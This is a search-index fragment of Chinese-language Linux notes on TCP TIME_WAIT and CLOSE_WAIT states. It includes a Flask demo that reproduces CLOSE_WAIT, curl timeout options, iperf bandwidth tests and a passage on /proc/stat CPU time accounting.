\u8ba94\u6b21\u63e1\u624b\u5173\u95ed\u6d41\u7a0b\u66f4\u52a0\u53ef\u9760\uff1b4\u6b21\u63e1\u624b\u7684\u6700\u540e\u4e00\u4e2aACK\u662f\u662f\u7531\u4e3b\u52a8\u5173\u95ed\u65b9\u53d1\u9001\u51fa\u53bb\u7684\uff0c\u82e5\u8fd9\u4e2aACK\u4e22\u5931\uff0c\u88ab\u52a8\u5173\u95ed\u65b9\u4f1a\u518d\u6b21\u53d1\u4e00\u4e2aFIN\u8fc7\u6765\u3002\u82e5\u4e3b\u52a8\u5173\u95ed\u65b9\u80fd\u591f\u4fdd\u6301\u4e00\u4e2a2MSL\u7684TIME_WAIT\u72b6\u6001\uff0c\u5219\u6709\u66f4\u5927\u7684\u673a\u4f1a\u8ba9\u4e22\u5931\u7684ACK\u88ab\u518d\u6b21\u53d1\u9001\u51fa\u53bb\u3002 \u9632\u6b62lost duplicate\u5bf9\u540e\u7eed\u65b0\u5efa\u6b63\u5e38\u94fe\u63a5\u7684\u4f20\u8f93\u9020\u6210\u7834\u574f\u3002lost duplicate\u5728\u5b9e\u9645\u7684\u7f51\u7edc\u4e2d\u975e\u5e38\u5e38\u89c1\uff0c\u7ecf\u5e38\u662f\u7531\u4e8e\u8def\u7531\u5668\u4ea7\u751f\u6545\u969c\uff0c\u8def\u5f84\u65e0\u6cd5\u6536\u655b\uff0c\u5bfc\u81f4\u4e00\u4e2apacket\u5728\u8def\u7531\u5668A\uff0cB\uff0cC\u4e4b\u95f4\u505a\u7c7b\u4f3c\u6b7b\u5faa\u73af\u7684\u8df3\u8f6c\u3002IP\u5934\u90e8\u6709\u4e2aTTL\uff0c\u9650\u5236\u4e86\u4e00\u4e2a\u5305\u5728\u7f51\u7edc\u4e2d\u7684\u6700\u5927\u8df3\u6570\uff0c\u56e0\u6b64\u8fd9\u4e2a\u5305\u6709\u4e24\u79cd\u547d\u8fd0\uff0c\u8981\u4e48\u6700\u540eTTL\u53d8\u4e3a0\uff0c\u5728\u7f51\u7edc\u4e2d\u6d88\u5931\uff1b\u8981\u4e48TTL\u5728\u53d8\u4e3a0\u4e4b\u524d\u8def\u7531\u5668\u8def\u5f84\u6536\u655b\uff0c\u5b83\u51ed\u501f\u5269\u4f59\u7684TTL\u8df3\u6570\u7ec8\u4e8e\u5230\u8fbe\u76ee\u7684\u5730\u3002\u4f46\u975e\u5e38\u53ef\u60dc\u7684\u662fTCP\u901a\u8fc7\u8d85\u65f6\u91cd\u4f20\u673a\u5236\u5728\u65e9\u4e9b\u65f6\u5019\u53d1\u9001\u4e86\u4e00\u4e2a\u8ddf\u5b83\u4e00\u6a21\u4e00\u6837\u7684\u5305\uff0c\u5e76\u5148\u4e8e\u5b83\u8fbe\u5230\u4e86\u76ee\u7684\u5730\uff0c\u56e0\u6b64\u5b83\u7684\u547d\u8fd0\u4e5f\u5c31\u6ce8\u5b9a\u88abTCP\u534f\u8bae\u6808\u629b\u5f03\u3002\u53e6\u5916\u4e00\u4e2a\u6982\u5ff5\u53eb\u505aincarnation connection\uff0c\u6307\u8ddf\u4e0a\u6b21\u7684socket pair\u4e00\u6478\u4e00\u6837\u7684\u65b0\u8fde\u63a5\uff0c\u53eb\u505aincarnation of previous connection\u3002lost duplicate\u52a0\u4e0aincarnation connection\uff0c\u5219\u4f1a\u5bf9\u6211\u4eec\u7684\u4f20\u8f93\u9020\u6210\u81f4\u547d\u7684\u9519\u8bef\u3002\u5927\u5bb6\u90fd\u77e5\u9053TCP\u662f\u6d41\u5f0f\u7684\uff0c\u6240\u6709\u5305\u5230\u8fbe\u7684\u987a\u5e8f\u662f\u4e0d\u4e00\u81f4\u7684\uff0c\u4f9d\u9760\u5e8f\u5217\u53f7\u7531TCP\u534f\u8bae\u6808\u505a\u987a\u5e8f\u7684\u62fc\u63a5\uff1b\u5047\u8bbe\u4e00\u4e2aincarnation connection\u8fd9\u65f6\u6536\u5230\u7684seq=1000, \u6765\u4e86\u4e00\u4e2alost duplicate\u4e3aseq=1000, len=1000, \u5219tcp\u8ba4\u4e3a\u8fd9\u4e2alost duplicate\u5408\u6cd5\uff0c\u5e76\u5b58\u653e\u5165\u4e86receive buffer\uff0c\u5bfc\u81f4\u4f20\u8f93\u51fa\u73b0\u9519\u8bef\u3002\u901a\u8fc7\u4e00\u4e2a2MSL TIME_WAIT\u72b6\u6001\uff0c\u786e\u4fdd\u6240\u6709\u7684lost duplicate\u90fd\u4f1a\u6d88\u5931\u6389\uff0c\u907f\u514d\u5bf9\u65b0\u8fde\u63a5\u9020\u6210\u9519\u8bef\u3002 \u5982\u679c\u673a\u5668\u4e0a\u6709time_wait \uff0c\u8c03\u4f18\u540e\u8fd8\u662f\u6709\uff0c\u8bf4\u660e\u673a\u5668\u8d44\u6e90\u7d27\u5f20\uff0c\u5e94\u8be5\u8fdb\u884c\u5347\u7ea7\u914d\u7f6e\uff0c\u6216\u8005\u4ee3\u7801\u672c\u8eab\u95ee\u9898 \u2022 CLOSED: \u5173\u95ed\u72b6\u6001\uff0c\u6ca1\u6709\u8fde\u63a5\u6d3b\u52a8 \u2022 LISTEN: \u76d1\u542c\u72b6\u6001\uff0c\u670d\u52a1\u5668\u6b63\u5728\u7b49\u5f85\u8fde\u63a5\u8fdb\u5165 \u2022 SYN_SENT: \u5df2\u7ecf\u53d1\u51fa\u8fde\u63a5\u8bf7\u6c42\uff0c\u7b49\u5f85\u786e\u8ba4 \u2022 SYN_RCVD: \u6536\u5230\u4e00\u4e2a\u8fde\u63a5\u8bf7\u6c42\uff0c\u5c1a\u672a\u786e\u8ba4 \u2022 ESTABLISHED: \u8fde\u63a5\u5efa\u7acb\uff0c\u6b63\u5e38\u6570\u636e\u4f20\u8f93\u72b6\u6001 \u2022 FIN_WAIT_1:\uff08\u4e3b\u52a8\u5173\u95ed\uff09\u5df2\u7ecf\u53d1\u9001\u5173\u95ed\u8bf7\u6c42\uff0c\u7b49\u5f85\u786e\u8ba4 \u2022 FIN_WAIT_2:\uff08\u4e3b\u52a8\u5173\u95ed\uff09\u6536\u5230\u5bf9\u65b9\u5173\u95ed\u786e\u8ba4\uff0c\u7b49\u5f85\u5bf9\u65b9\u5173\u95ed\u8bf7\u6c42 \u2022 CLOSE_WAIT:\uff08\u88ab\u52a8\u5173\u95ed\uff09\u6536\u5230\u5bf9\u65b9\u5173\u95ed\u8bf7\u6c42\uff0c\u5df2\u7ecf\u786e\u8ba4 \u2022 LAST_ACK:\uff08\u88ab\u52a8\u5173\u95ed\uff09\u7b49\u5f85\u6700\u540e\u4e00\u4e2a\u5173\u95ed\u786e\u8ba4\uff0c\u5e76\u7b49\u5f85\u6240\u6709\u5206\u7ec4\u6b7b\u6389 \u2022 TIMED_WAIT: \u5b8c\u6210\u53cc\u5411\u5173\u95ed\uff0c\u7b49\u5f85\u6240\u6709\u5206\u7ec4\u6b7b\u6389 \u2022 CLOSING: \u53cc\u65b9\u540c\u65f6\u5c1d\u8bd5\u5173\u95ed\uff0c\u7b49\u5f85\u5bf9\u65b9\u786e\u8ba4 \u4ece\u56fe\u4e0a\u8bb2\uff0c\u5ba2\u6237\u7aef\u4e3b\u52a8\u5173\u95ed\u8fde\u63a5\uff0c\u6b64\u65f6\u670d\u52a1\u5668\u5c31\u4f1a\u51fa\u73b0close_wait \u6309\u7167\u4e0a\u56fe\u6240\u793a\uff0c\u6211\u6765\u7528Python\u5199\u4e2ahttp\u8bf7\u6c42\u3002 \u6587\u4ef6\u540d\u4e3a my_flask.py # -*- coding: utf-8 -* from flask import Flask, request import datetime import sys import time reload(sys) sys.setdefaultencoding(\"utf-8\") ENV = 'development' DEBUG = True SECRET_KEY = 'development key' app = Flask(__name__) app.config.from_object(__name__) app.app_context().push() app.permanent_session_lifetime = datetime.timedelta(seconds=10 * 60) # \u8bbe\u7f6e\u8fde\u63a5\u65f6\u957f @app.route('/mypost', methods=['GET', 'POST']) def mypost(): if request.method == 'POST': temp = request.json.get('data') print(temp) return \"success post\" @app.route('/myget', methods=['GET', 'POST']) def myget(): if request.method == 'GET': time.sleep(100) return \"success get\" @app.route('/myget1', methods=['GET', 'POST']) def myget_one(): if request.method == 'GET': return \"success get\" if __name__ == '__main__': # \u5728\u670d\u52a1\u5668\u4e0a\uff0c\u8fd9\u4e48\u542f\u52a8 # app.run(host='0.0.0.0') app.run(host='0.0.0.0',threaded=True) \u4e0a\u9762\u7684\u4ee3\u7801 myget\u91cc\u9762\u6211\u5199\u4e86\u7761100\u79d2\uff0c\u6765\u6a21\u62df\u590d\u6742\u7684\u903b\u8f91\u9020\u6210\u63a5\u53e3\u8fd4\u56de\u6570\u636e\u7b49\u5f85\u65f6\u95f4\u5f88\u957f\uff0c\u5982\u4e0b\u56fe\u542f\u52a8 \u7136\u540e\u518d\u5ba2\u6237\u7aef\u4e0a\u6267\u884ccurl\u547d\u4ee4\uff0c\u6a21\u62df\u5ba2\u6237\u7aef\u8bf7\u6c42\u3002 \u53d1\u73b0\u5ba2\u6237\u7aef\u5df2\u7ecf\u548c\u670d\u52a1\u7aef\u5efa\u7acb\u4e86\u94fe\u63a5 \u53d8\u5316\u592a\u5feb\uff0c\u622a\u56fe\u4e0d\u5230\uff0c\u5efa\u7acb\u94fe\u63a5\u8fd9\u5f20\u56fe\u548c\u4e0b\u9762\u4e24\u4e2aFIN_WAIT\u5206\u522b\u5c5e\u4e8e\u4e24\u6b21\u5b9e\u9a8c curl\u547d\u4ee4\u7136\u540eCtrl+c\u6389\uff0c\u5ba2\u6237\u7aef\u7684\u94fe\u63a5\u53d8\u6210\u4e86FIN_WAIT1 \u7136\u540e\u53d8\u6210\u4e86 \u4ece\u670d\u52a1\u7aef\u4e0a\u622a\u56fe\u4e0a\u770b \u4e0a\u9762\u662f\u56e0\u4e3a\u670d\u52a1\u7aef\u8fd8\u6ca1\u5904\u7406\u5b8c\uff0c\u670d\u52a1\u7aef\u8fdf\u8fdf\u4e0d\u7ed9\u5ba2\u6237\u7aef\u8fd4\u56deFIN+ACK\u5305\uff0c\u6240\u4ee5\u670d\u52a1\u7aef\u4f1a\u5448\u73b0\u51faclose_wait \u8fd8\u6709\u79cd\u60c5\u51b5\u662f\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u5efa\u7acb\u8fde\u63a5\u540e\uff0c\u5ba2\u6237\u7aef\u7ed9\u670d\u52a1\u7aef\u53d1\u9001\u6570\u636e\uff0c\u6570\u636e\u4f1a\u88ab\u653e\u5165 accept queue (\u5168\u8fde\u63a5\u961f\u5217)\uff0c\u7b49\u5f85\u5e94\u7528 accept\uff08\u63a5\u6536\uff09\uff0c\u5982\u679c\u5e94\u7528\u8fdf\u8fdf\u6ca1\u6709\u4eceaccept queue\u91cc\u9762\u53bb accept \u8fde\u63a5\uff0c\u7b49\u5230 client \u8d85\u65f6\u65f6\u95f4\uff0c\u4e3b\u52a8\u5173\u95ed\u4e86\u8fde\u63a5\uff0c\u8fd9\u65f6\u8fde\u63a5\u5728 server \u7aef\u4ecd\u5728\u5168\u8fde\u63a5\u961f\u5217\u4e2d\uff0c\u72b6\u6001\u53d8\u4e3a CLOSE_WAIT \u8865\u5145 curl --connect-timeout 10 -m 20 \"http://XXXXXXX\" --connect-timeout \u4e3a\u5141\u8bb8\u8fde\u63a5\u5230\u670d\u52a1\u5668\u7684\u6700\u957f\u65f6\u95f4\uff0c\u5c31\u662f\u7f51\u7edc\u5efa\u7acb\u8fde\u63a5\u7684\u8fc7\u7a0b\u7684\u6700\u957f\u65f6\u95f4 \u8fde\u63a5\u8d85\u65f6\u7684\u8bdd\uff0c\u51fa\u9519\u63d0\u793a\u5f62\u5982\uff1a curl: (28) connect() timed out! -m \u5141\u8bb8\u6574\u4e2a\u64cd\u4f5c\u6240\u7528\u7684\u6700\u957f\u65f6\u95f4\uff0c\u5c31\u662fcurl\u547d\u4ee4\u7684\u6267\u884c\u65f6\u95f4 \u51fa\u9519\u63d0\u793a\u5982\uff1acurl: (28) Operation timed out after 2000 milliseconds with 0 bytes received \u5ba2\u6237\u7aef\u6267\u884c curl -m 1 http://192.168.80.128:5000/myget || netstat -tanp","title":"\u6a21\u62df\u4e00\u6b21CLOSE_WAIT"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E6%A8%A1%E6%8B%9F%E4%B8%80%E6%AC%A1/#python-close_wait","text":"","title":"Python \u6a21\u62df\u4e00\u4e2aCLOSE_WAIT"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E6%A8%A1%E6%8B%9F%E4%B8%80%E6%AC%A1/#time_wait","text":"\u8ba94\u6b21\u63e1\u624b\u5173\u95ed\u6d41\u7a0b\u66f4\u52a0\u53ef\u9760\uff1b4\u6b21\u63e1\u624b\u7684\u6700\u540e\u4e00\u4e2aACK\u662f\u662f\u7531\u4e3b\u52a8\u5173\u95ed\u65b9\u53d1\u9001\u51fa\u53bb\u7684\uff0c\u82e5\u8fd9\u4e2aACK\u4e22\u5931\uff0c\u88ab\u52a8\u5173\u95ed\u65b9\u4f1a\u518d\u6b21\u53d1\u4e00\u4e2aFIN\u8fc7\u6765\u3002\u82e5\u4e3b\u52a8\u5173\u95ed\u65b9\u80fd\u591f\u4fdd\u6301\u4e00\u4e2a2MSL\u7684TIME_WAIT\u72b6\u6001\uff0c\u5219\u6709\u66f4\u5927\u7684\u673a\u4f1a\u8ba9\u4e22\u5931\u7684ACK\u88ab\u518d\u6b21\u53d1\u9001\u51fa\u53bb\u3002 \u9632\u6b62lost duplicate\u5bf9\u540e\u7eed\u65b0\u5efa\u6b63\u5e38\u94fe\u63a5\u7684\u4f20\u8f93\u9020\u6210\u7834\u574f\u3002lost duplicate\u5728\u5b9e\u9645\u7684\u7f51\u7edc\u4e2d\u975e\u5e38\u5e38\u89c1\uff0c\u7ecf\u5e38\u662f\u7531\u4e8e\u8def\u7531\u5668\u4ea7\u751f\u6545\u969c\uff0c\u8def\u5f84\u65e0\u6cd5\u6536\u655b\uff0c\u5bfc\u81f4\u4e00\u4e2apacket\u5728\u8def\u7531\u5668A\uff0cB\uff0cC\u4e4b\u95f4\u505a\u7c7b\u4f3c\u6b7b\u5faa\u73af\u7684\u8df3\u8f6c\u3002IP\u5934\u90e8\u6709\u4e2aTTL\uff0c\u9650\u5236\u4e86\u4e00\u4e2a\u5305\u5728\u7f51\u7edc\u4e2d\u7684\u6700\u5927\u8df3\u6570\uff0c\u56e0\u6b64\u8fd9\u4e2a\u5305\u6709\u4e24\u79cd\u547d\u8fd0\uff0c\u8981\u4e48\u6700\u540eTTL\u53d8\u4e3a0\uff0c\u5728\u7f51\u7edc\u4e2d\u6d88\u5931\uff1b\u8981\u4e48TTL\u5728\u53d8\u4e3a0\u4e4b\u524d\u8def\u7531\u5668\u8def\u5f84\u6536\u655b\uff0c\u5b83\u51ed\u501f\u5269\u4f59\u7684TTL\u8df3\u6570\u7ec8\u4e8e\u5230\u8fbe\u76ee\u7684\u5730\u3002\u4f46\u975e\u5e38\u53ef\u60dc\u7684\u662fTCP\u901a\u8fc7\u8d85\u65f6\u91cd\u4f20\u673a\u5236\u5728\u65e9\u4e9b\u65f6\u5019\u53d1\u9001\u4e86\u4e00\u4e2a\u8ddf\u5b83\u4e00\u6a21\u4e00\u6837\u7684\u5305\uff0c\u5e76\u5148\u4e8e\u5b83\u8fbe\u5230\u4e86\u76ee\u7684\u5730\uff0c\u56e0\u6b64\u5b83\u7684\u547d\u8fd0\u4e5f\u5c31\u6ce8\u5b9a\u88abTCP\u534f\u8bae\u6808\u629b\u5f03\u3002\u53e6\u5916\u4e00\u4e2a\u6982\u5ff5\u53eb\u505aincarnation connection\uff0c\u6307\u8ddf\u4e0a\u6b21\u7684socket pair\u4e00\u6478\u4e00\u6837\u7684\u65b0\u8fde\u63a5\uff0c\u53eb\u505aincarnation of previous connection\u3002lost duplicate\u52a0\u4e0aincarnation connection\uff0c\u5219\u4f1a\u5bf9\u6211\u4eec\u7684\u4f20\u8f93\u9020\u6210\u81f4\u547d\u7684\u9519\u8bef\u3002\u5927\u5bb6\u90fd\u77e5\u9053TCP\u662f\u6d41\u5f0f\u7684\uff0c\u6240\u6709\u5305\u5230\u8fbe\u7684\u987a\u5e8f\u662f\u4e0d\u4e00\u81f4\u7684\uff0c\u4f9d\u9760\u5e8f\u5217\u53f7\u7531TCP\u534f\u8bae\u6808\u505a\u987a\u5e8f\u7684\u62fc\u63a5\uff1b\u5047\u8bbe\u4e00\u4e2aincarnation connection\u8fd9\u65f6\u6536\u5230\u7684seq=1000, \u6765\u4e86\u4e00\u4e2alost duplicate\u4e3aseq=1000, len=1000, \u5219tcp\u8ba4\u4e3a\u8fd9\u4e2alost duplicate\u5408\u6cd5\uff0c\u5e76\u5b58\u653e\u5165\u4e86receive buffer\uff0c\u5bfc\u81f4\u4f20\u8f93\u51fa\u73b0\u9519\u8bef\u3002\u901a\u8fc7\u4e00\u4e2a2MSL TIME_WAIT\u72b6\u6001\uff0c\u786e\u4fdd\u6240\u6709\u7684lost duplicate\u90fd\u4f1a\u6d88\u5931\u6389\uff0c\u907f\u514d\u5bf9\u65b0\u8fde\u63a5\u9020\u6210\u9519\u8bef\u3002 \u5982\u679c\u673a\u5668\u4e0a\u6709time_wait \uff0c\u8c03\u4f18\u540e\u8fd8\u662f\u6709\uff0c\u8bf4\u660e\u673a\u5668\u8d44\u6e90\u7d27\u5f20\uff0c\u5e94\u8be5\u8fdb\u884c\u5347\u7ea7\u914d\u7f6e\uff0c\u6216\u8005\u4ee3\u7801\u672c\u8eab\u95ee\u9898 \u2022 CLOSED: \u5173\u95ed\u72b6\u6001\uff0c\u6ca1\u6709\u8fde\u63a5\u6d3b\u52a8 \u2022 LISTEN: \u76d1\u542c\u72b6\u6001\uff0c\u670d\u52a1\u5668\u6b63\u5728\u7b49\u5f85\u8fde\u63a5\u8fdb\u5165 \u2022 SYN_SENT: \u5df2\u7ecf\u53d1\u51fa\u8fde\u63a5\u8bf7\u6c42\uff0c\u7b49\u5f85\u786e\u8ba4 \u2022 SYN_RCVD: \u6536\u5230\u4e00\u4e2a\u8fde\u63a5\u8bf7\u6c42\uff0c\u5c1a\u672a\u786e\u8ba4 \u2022 ESTABLISHED: \u8fde\u63a5\u5efa\u7acb\uff0c\u6b63\u5e38\u6570\u636e\u4f20\u8f93\u72b6\u6001 \u2022 FIN_WAIT_1:\uff08\u4e3b\u52a8\u5173\u95ed\uff09\u5df2\u7ecf\u53d1\u9001\u5173\u95ed\u8bf7\u6c42\uff0c\u7b49\u5f85\u786e\u8ba4 \u2022 FIN_WAIT_2:\uff08\u4e3b\u52a8\u5173\u95ed\uff09\u6536\u5230\u5bf9\u65b9\u5173\u95ed\u786e\u8ba4\uff0c\u7b49\u5f85\u5bf9\u65b9\u5173\u95ed\u8bf7\u6c42 \u2022 CLOSE_WAIT:\uff08\u88ab\u52a8\u5173\u95ed\uff09\u6536\u5230\u5bf9\u65b9\u5173\u95ed\u8bf7\u6c42\uff0c\u5df2\u7ecf\u786e\u8ba4 \u2022 LAST_ACK:\uff08\u88ab\u52a8\u5173\u95ed\uff09\u7b49\u5f85\u6700\u540e\u4e00\u4e2a\u5173\u95ed\u786e\u8ba4\uff0c\u5e76\u7b49\u5f85\u6240\u6709\u5206\u7ec4\u6b7b\u6389 \u2022 TIMED_WAIT: \u5b8c\u6210\u53cc\u5411\u5173\u95ed\uff0c\u7b49\u5f85\u6240\u6709\u5206\u7ec4\u6b7b\u6389 \u2022 CLOSING: \u53cc\u65b9\u540c\u65f6\u5c1d\u8bd5\u5173\u95ed\uff0c\u7b49\u5f85\u5bf9\u65b9\u786e\u8ba4 \u4ece\u56fe\u4e0a\u8bb2\uff0c\u5ba2\u6237\u7aef\u4e3b\u52a8\u5173\u95ed\u8fde\u63a5\uff0c\u6b64\u65f6\u670d\u52a1\u5668\u5c31\u4f1a\u51fa\u73b0close_wait \u6309\u7167\u4e0a\u56fe\u6240\u793a\uff0c\u6211\u6765\u7528Python\u5199\u4e2ahttp\u8bf7\u6c42\u3002 \u6587\u4ef6\u540d\u4e3a my_flask.py # -*- coding: utf-8 -* from flask import Flask, request import datetime import sys import time reload(sys) sys.setdefaultencoding(\"utf-8\") ENV = 'development' DEBUG = True SECRET_KEY = 'development key' app = Flask(__name__) app.config.from_object(__name__) app.app_context().push() app.permanent_session_lifetime = datetime.timedelta(seconds=10 * 60) # \u8bbe\u7f6e\u8fde\u63a5\u65f6\u957f @app.route('/mypost', methods=['GET', 'POST']) def mypost(): if request.method == 'POST': temp = request.json.get('data') print(temp) return \"success post\" @app.route('/myget', methods=['GET', 'POST']) def myget(): if request.method == 'GET': time.sleep(100) return \"success get\" @app.route('/myget1', methods=['GET', 'POST']) def myget_one(): if request.method == 'GET': return \"success get\" if __name__ == '__main__': # \u5728\u670d\u52a1\u5668\u4e0a\uff0c\u8fd9\u4e48\u542f\u52a8 # app.run(host='0.0.0.0') app.run(host='0.0.0.0',threaded=True) \u4e0a\u9762\u7684\u4ee3\u7801 myget\u91cc\u9762\u6211\u5199\u4e86\u7761100\u79d2\uff0c\u6765\u6a21\u62df\u590d\u6742\u7684\u903b\u8f91\u9020\u6210\u63a5\u53e3\u8fd4\u56de\u6570\u636e\u7b49\u5f85\u65f6\u95f4\u5f88\u957f\uff0c\u5982\u4e0b\u56fe\u542f\u52a8 \u7136\u540e\u518d\u5ba2\u6237\u7aef\u4e0a\u6267\u884ccurl\u547d\u4ee4\uff0c\u6a21\u62df\u5ba2\u6237\u7aef\u8bf7\u6c42\u3002 \u53d1\u73b0\u5ba2\u6237\u7aef\u5df2\u7ecf\u548c\u670d\u52a1\u7aef\u5efa\u7acb\u4e86\u94fe\u63a5 \u53d8\u5316\u592a\u5feb\uff0c\u622a\u56fe\u4e0d\u5230\uff0c\u5efa\u7acb\u94fe\u63a5\u8fd9\u5f20\u56fe\u548c\u4e0b\u9762\u4e24\u4e2aFIN_WAIT\u5206\u522b\u5c5e\u4e8e\u4e24\u6b21\u5b9e\u9a8c curl\u547d\u4ee4\u7136\u540eCtrl+c\u6389\uff0c\u5ba2\u6237\u7aef\u7684\u94fe\u63a5\u53d8\u6210\u4e86FIN_WAIT1 \u7136\u540e\u53d8\u6210\u4e86 \u4ece\u670d\u52a1\u7aef\u4e0a\u622a\u56fe\u4e0a\u770b \u4e0a\u9762\u662f\u56e0\u4e3a\u670d\u52a1\u7aef\u8fd8\u6ca1\u5904\u7406\u5b8c\uff0c\u670d\u52a1\u7aef\u8fdf\u8fdf\u4e0d\u7ed9\u5ba2\u6237\u7aef\u8fd4\u56deFIN+ACK\u5305\uff0c\u6240\u4ee5\u670d\u52a1\u7aef\u4f1a\u5448\u73b0\u51faclose_wait \u8fd8\u6709\u79cd\u60c5\u51b5\u662f\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u5efa\u7acb\u8fde\u63a5\u540e\uff0c\u5ba2\u6237\u7aef\u7ed9\u670d\u52a1\u7aef\u53d1\u9001\u6570\u636e\uff0c\u6570\u636e\u4f1a\u88ab\u653e\u5165 accept queue (\u5168\u8fde\u63a5\u961f\u5217)\uff0c\u7b49\u5f85\u5e94\u7528 accept\uff08\u63a5\u6536\uff09\uff0c\u5982\u679c\u5e94\u7528\u8fdf\u8fdf\u6ca1\u6709\u4eceaccept queue\u91cc\u9762\u53bb accept \u8fde\u63a5\uff0c\u7b49\u5230 client \u8d85\u65f6\u65f6\u95f4\uff0c\u4e3b\u52a8\u5173\u95ed\u4e86\u8fde\u63a5\uff0c\u8fd9\u65f6\u8fde\u63a5\u5728 server \u7aef\u4ecd\u5728\u5168\u8fde\u63a5\u961f\u5217\u4e2d\uff0c\u72b6\u6001\u53d8\u4e3a CLOSE_WAIT","title":"TIME_WAIT\u72b6\u6001\u7684\u5b58\u5728\u6709\u4e24\u4e2a\u7406\u7531\uff1a"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E6%A8%A1%E6%8B%9F%E4%B8%80%E6%AC%A1/#_1","text":"curl --connect-timeout 10 -m 20 \"http://XXXXXXX\" --connect-timeout \u4e3a\u5141\u8bb8\u8fde\u63a5\u5230\u670d\u52a1\u5668\u7684\u6700\u957f\u65f6\u95f4\uff0c\u5c31\u662f\u7f51\u7edc\u5efa\u7acb\u8fde\u63a5\u7684\u8fc7\u7a0b\u7684\u6700\u957f\u65f6\u95f4 \u8fde\u63a5\u8d85\u65f6\u7684\u8bdd\uff0c\u51fa\u9519\u63d0\u793a\u5f62\u5982\uff1a curl: (28) connect() timed out! -m \u5141\u8bb8\u6574\u4e2a\u64cd\u4f5c\u6240\u7528\u7684\u6700\u957f\u65f6\u95f4\uff0c\u5c31\u662fcurl\u547d\u4ee4\u7684\u6267\u884c\u65f6\u95f4 \u51fa\u9519\u63d0\u793a\u5982\uff1acurl: (28) Operation timed out after 2000 milliseconds with 0 bytes received \u5ba2\u6237\u7aef\u6267\u884c curl -m 1 http://192.168.80.128:5000/myget || netstat -tanp","title":"\u8865\u5145"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E6%B5%8B%E8%AF%95%E7%BD%91%E7%BB%9C%E5%B8%A6%E5%AE%BD/","text":"\u6d4b\u8bd5TCP\u548cUDP\u5e26\u5bbd 1.\u6d4b\u8bd5TCP\u5e26\u5bbd \u670d\u52a1\u7aef\u8fd0\u884c iperf -s \u5ba2\u6237\u7aef\u8fd0\u884c iperf -c x.x.x.x -b 1000M -t 60 (x.x.x.x\u4e3a\u670d\u52a1\u7aef\u7684IP,\u6bcf\u79d2\u53d1\u90011000M\u5c0fb\uff0c\u6301\u7eed\u53d1\u900160\u79d2) 2.\u6d4b\u8bd5UDP\u5e26\u5bbd \u670d\u52a1\u7aef\u8fd0\u884c iperf -u -s \u5ba2\u6237\u7aef\u8fd0\u884c iperf -c x.x.x.x -u -b 1000M -t 60 (x.x.x.x\u4e3a\u670d\u52a1\u7aef\u7684IP,\u6bcf\u79d2\u53d1\u90011000M\u5c0fb\uff0c\u6301\u7eed\u53d1\u900160\u79d2)","title":"\u6d4b\u8bd5TCP\u5e26\u5bbd"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/0proc0stat/","text":"/proc/stat Linux \u4f5c\u4e3a\u4e00\u4e2a\u591a\u4efb\u52a1\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5c06\u6bcf\u4e2a CPU \u7684\u65f6\u95f4\u5212\u5206\u4e3a\u5f88\u77ed\u7684\u65f6\u95f4\u7247\uff0c\u518d\u901a\u8fc7\u8c03\u5ea6\u5668\u8f6e\u6d41\u5206\u914d\u7ed9\u5404\u4e2a\u4efb\u52a1\u4f7f\u7528\uff0c\u56e0\u6b64\u9020\u6210\u591a\u4efb\u52a1\u540c\u65f6\u8fd0\u884c\u7684\u9519\u89c9\u3002\u4e3a\u4e86\u7ef4\u62a4 CPU \u65f6\u95f4\uff0cLinux \u901a\u8fc7\u4e8b\u5148\u5b9a\u4e49\u7684\u8282\u62cd\u7387\uff08\u5185\u6838\u4e2d\u8868\u793a\u4e3a HZ\uff09\uff0c\u89e6\u53d1\u65f6\u95f4\u4e2d\u65ad\uff0c\u5e76\u4f7f\u7528\u5168\u5c40\u53d8\u91cf Jiffies \u8bb0\u5f55\u4e86\u5f00\u673a\u4ee5\u6765\u7684\u8282\u62cd\u6570\u3002\u6bcf\u53d1\u751f\u4e00\u6b21\u65f6\u95f4\u4e2d\u65ad\uff0cJiffies \u7684\u503c\u5c31\u52a0 1\u3002\u8282\u62cd\u7387 HZ \u662f\u5185\u6838\u7684\u53ef\u914d\u9009\u9879\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a 100\u3001250\u30011000 \u7b49\u3002\u4e0d\u540c\u7684\u7cfb\u7edf\u53ef\u80fd\u8bbe\u7f6e\u4e0d\u540c\u6570\u503c\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u67e5\u8be2 /boot/config \u5185\u6838\u9009\u9879\u6765\u67e5\u770b\u5b83\u7684\u914d\u7f6e\u503c\u3002\u6bd4\u5982\u5728\u6211\u7684\u7cfb\u7edf\u4e2d\uff0c\u8282\u62cd\u7387\u8bbe\u7f6e\u6210\u4e86 250\uff0c\u4e5f\u5c31\u662f\u6bcf\u79d2\u949f\u89e6\u53d1 250 \u6b21\u65f6\u95f4\u4e2d\u65ad\u3002 $ grep 'CONFIG_HZ=' /boot/config-$(uname -r) CONFIG_HZ=250 \u540c\u65f6\uff0c\u6b63\u56e0\u4e3a\u8282\u62cd\u7387 HZ \u662f\u5185\u6838\u9009\u9879\uff0c\u6240\u4ee5\u7528\u6237\u7a7a\u95f4\u7a0b\u5e8f\u5e76\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u3002\u4e3a\u4e86\u65b9\u4fbf\u7528\u6237\u7a7a\u95f4\u7a0b\u5e8f\uff0c\u5185\u6838\u8fd8\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7528\u6237\u7a7a\u95f4\u8282\u62cd\u7387 USER_HZ\uff0c\u5b83\u603b\u662f\u56fa\u5b9a\u4e3a 100\uff0c\u4e5f\u5c31\u662f 1/100 \u79d2\u3002\u8fd9\u6837\uff0c\u7528\u6237\u7a7a\u95f4\u7a0b\u5e8f\u5e76\u4e0d\u9700\u8981\u5173\u5fc3\u5185\u6838\u4e2d HZ \u88ab\u8bbe\u7f6e\u6210\u4e86\u591a\u5c11\uff0c\u56e0\u4e3a\u5b83\u770b\u5230\u7684\u603b\u662f\u56fa\u5b9a\u503c USER_HZ\u3002\u53ef\u4ee5\u901a\u8fc7shell\u547d\u4ee4getconf\u83b7\u5f97USER_HZ\u7684\u503c\uff1a $ getconf CLK_TCK 100 Linux \u901a\u8fc7 /proc 